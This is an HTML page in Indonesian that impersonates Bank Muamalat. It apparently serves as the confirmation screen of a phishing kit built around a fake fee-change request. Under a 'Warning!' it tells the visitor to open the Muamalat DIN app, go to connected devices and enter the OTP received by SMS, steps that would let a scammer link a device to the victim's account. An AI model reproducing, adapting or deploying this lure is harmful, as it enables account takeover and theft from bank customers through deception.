<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Buka aplikasi</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
            crossorigin="anonymous"
        />
        <style>
            .btn {
                width: 100%;
                background-color: purple;
                color: #fff;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="card mt-5">
                <div
                    class="card-header text-center"
                    style="background-color: #fff"
                >
                    <img src="muamalat.png" alt="" width="40%" />
                </div>
                <div class="card-body">
                    <p class="text-center" style="color: purple">
                        Terimakasih permintaan ubah tarif anda sedang di proses
                    </p>
                    <div class="text-center">
                        <img src="succ.png" width="20%" />
                    </div>
                    <div class="text-center mt-2">
                        <p style="color: red">Warning!</p>
                        <p>Silahkan Buka apk Muamalat DIN anda</p>
                        <p>- Pilih Setelan</p>
                        <p>- Perangkat terhubung</p>
                        <p>- Masukkan Otp yang dikirim via SMS selesai</p>
                    </div>
                </div>
            </div>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
            crossorigin="anonymous"
        ></script>
    </body>
</html>
